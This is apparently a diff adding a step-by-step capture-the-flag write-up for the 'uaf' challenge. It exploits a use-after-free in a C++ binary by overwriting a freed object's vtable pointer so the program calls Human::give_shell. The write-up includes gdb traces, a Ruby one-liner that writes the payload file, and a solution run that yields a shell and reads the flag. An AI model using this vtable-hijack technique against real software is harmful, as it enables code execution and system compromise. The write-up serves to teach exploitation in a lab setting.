@@ -315,6 +315,9 @@ Breakpoint 1, 0x0000000000400fcd in main ()
 3: /x *$rax = <error: Cannot access memory at address 0x1>
 4: /x $rdx = 0x7fff781e9ed8
 5: /x *$rdx = 0x1
+```
+We hit the breakpoint, let's step one instruction.
+```
 (gdb) si
 0x0000000000400fd1 in main ()
 1: x/i $pc
@@ -323,6 +326,10 @@ Breakpoint 1, 0x0000000000400fcd in main ()
 3: /x *$rax = 0x3f3e3d3c
 4: /x $rdx = 0x7fff781e9ed8
 5: /x *$rdx = 0x1
+```
+We see that the memory location `rax` points to is some of our fuzz data! 
+
+```
 (gdb) si
 0x0000000000400fd4 in main ()
 1: x/i $pc
@@ -331,6 +338,10 @@ Breakpoint 1, 0x0000000000400fcd in main ()
 3: /x *$rax = <error: Cannot access memory at address 0x434241403f3e3d3c>
 4: /x $rdx = 0x7fff781e9ed8
 5: /x *$rdx = 0x1
+```
+After the value at the location of `rax` is moved into `rax` and made into a QWORD. Now we can see we have quite a lot of sequential characters in rax, we now know we have 
+
+```
 (gdb) si
 0x0000000000400fd8 in main ()
 1: x/i $pc
@@ -339,6 +350,10 @@ Breakpoint 1, 0x0000000000400fcd in main ()
 3: /x *$rax = <error: Cannot access memory at address 0x434241403f3e3d44>
 4: /x $rdx = 0x7fff781e9ed8
 5: /x *$rdx = 0x1
+```
+`0x8` was added to `rax`, we should take note of this as whatever value we want to get into `rdx` needs to have `0x8` subtracted from it.
+
+```
 (gdb) si
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -355,18 +370,170 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 The program no longer exists.
 (gdb) 
 ```
-At the end, we can see `rax` contains some of our fuzzing data, With a bunch of sequential data. `rax` will be moved into `rdx` which will be the location that is jumped to in the `call *rdx`
+If we can supply `rax` with a valid function address, `rax` will be moved into `rdx` which will be the location that is jumped to in the `call *rdx` and we can get our win! We need to find some way to overwrite `0x00000000004012d2 Man::introduce()` so when it's called after we free it will call `0x000000000040117a Human::give_shell()` When looking at what `rax` evaluates out to when changed into `char`, it starts at `60` which is where we started in our fuzz data. Therefore, all we need to do is write our 8 byte address-`0x8` to the file at `/tmp/input.txt` run uaf with `./uaf 8 /tmp/input.txt` and use options `3221`. Let's find our vtable entries.
 
+```
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/uaf/uaf 
+1. use
+2. after
+3. free
+1
 
-We need to find some way to overwrite `0x00000000004012d2 Man::introduce()` so when it's called after we free it will call `0x000000000040117a Human::give_shell()`
+Breakpoint 1, 0x0000000000400fcd in main ()
+1: x/i $pc
+=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
+2: /x $rax = 0x1
+3: /x *$rax = <error: Cannot access memory at address 0x1>
+4: /x $rdx = 0x7fff05ebb768
+5: /x *$rdx = 0x1
+(gdb) si
+0x0000000000400fd1 in main ()
+1: x/i $pc
+=> 0x400fd1 <main+269>:	mov    (%rax),%rax
+2: /x $rax = 0xccdc50
+3: /x *$rax = 0x401570
+4: /x $rdx = 0x7fff05ebb768
+5: /x *$rdx = 0x1
+```
+We see `rax` is pointing to an address `0x00401570` Let's poke around at that address and see what we find.
 
-#### Testing
+```
+(gdb) x/x *0x00401570
+0x40117a <Human::give_shell()>:	0xe5894855
+(gdb) Quit
+(gdb) x/x 0x00401570
+0x401570 <vtable for Man+16>:	0x0040117a
+(gdb) 
+```
+So the vtable for `Man` is only 16 away from `give_shell`. We need to take the value for the vtable entry for `give_shell` minus `0x8` because the next instruction after this will add `0x8` and instead point to `Man::introduce()`, but we want `give_shell`. We take the address of `give_shell` `0x00401570` and subtract `0x8` `0x00401568`. Now we have our modified address to write into `m->introduce()`'s dereferenced pointer. 
 
-**run without arguments**
+Let's run one more time to make sure
+```
+uaf@ubuntu:~$ ruby -e "puts ?\x68 + ?\x15 + ?\x40 +( ?\x00*5)" > /tmp/input.txt
+uaf@ubuntu:~$ gdb uaf
 
-**run with arguments**
+(gdb) b *0x0000000000400fcd
+Breakpoint 1 at 0x400fcd
 
-**gathering exploit information**
+(gdb) run 8 /tmp/input.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/uaf/uaf 8 /tmp/input.txt
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+
+Breakpoint 1, 0x0000000000400fcd in main ()
+1: x/i $pc
+=> 0x400fcd <main+265>:	mov    -0x38(%rbp),%rax
+2: /x $rax = 0x1
+3: /x *$rax = <error: Cannot access memory at address 0x1>
+4: /x $rdx = 0x7ffea4ef4818
+5: /x *$rdx = 0x1
+(gdb) si
+0x0000000000400fd1 in main ()
+1: x/i $pc
+=> 0x400fd1 <main+269>:	mov    (%rax),%rax
+2: /x $rax = 0xe06c50
+3: /x *$rax = 0x401568
+4: /x $rdx = 0x7ffea4ef4818
+5: /x *$rdx = 0x1
+(gdb) si
+0x0000000000400fd4 in main ()
+1: x/i $pc
+=> 0x400fd4 <main+272>:	add    $0x8,%rax
+2: /x $rax = 0x401568
+3: /x *$rax = 0x4015d0
+4: /x $rdx = 0x7ffea4ef4818
+5: /x *$rdx = 0x1
+(gdb) si
+0x0000000000400fd8 in main ()
+1: x/i $pc
+=> 0x400fd8 <main+276>:	mov    (%rax),%rdx
+2: /x $rax = 0x401570
+3: /x *$rax = 0x40117a
+4: /x $rdx = 0x7ffea4ef4818
+5: /x *$rdx = 0x1
+(gdb) si
+0x0000000000400fdb in main ()
+1: x/i $pc
+=> 0x400fdb <main+279>:	mov    -0x38(%rbp),%rax
+2: /x $rax = 0x401570
+3: /x *$rax = 0x40117a
+4: /x $rdx = 0x40117a
+5: /x *$rdx = 0xe5894855
+(gdb) si
+0x0000000000400fdf in main ()
+1: x/i $pc
+=> 0x400fdf <main+283>:	mov    %rax,%rdi
+2: /x $rax = 0xe06c50
+3: /x *$rax = 0x401568
+4: /x $rdx = 0x40117a
+5: /x *$rdx = 0xe5894855
+(gdb) si
+0x0000000000400fe2 in main ()
+1: x/i $pc
+=> 0x400fe2 <main+286>:	callq  *%rdx
+2: /x $rax = 0xe06c50
+3: /x *$rax = 0x401568
+4: /x $rdx = 0x40117a
+5: /x *$rdx = 0xe5894855
+(gdb) si
+0x000000000040117a in Human::give_shell() ()
+1: x/i $pc
+=> 0x40117a <Human::give_shell()>:	push   %rbp
+2: /x $rax = 0xe06c50
+3: /x *$rax = 0x401568
+4: /x $rdx = 0x40117a
+5: /x *$rdx = 0xe5894855
+```
+We can see we are in `give_shell`!Let's run it for real now
+
+## Solution
+```
+uaf@ubuntu:~$ ruby -e "puts ?\x68 + ?\x15 + ?\x40 +( ?\x00*5)" > /tmp/input.txt
+uaf@ubuntu:~$ ./uaf 8 /tmp/input.txt
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+$ cat flag
+yay_<KEY>!
+$ 
+
+```
 
 
 
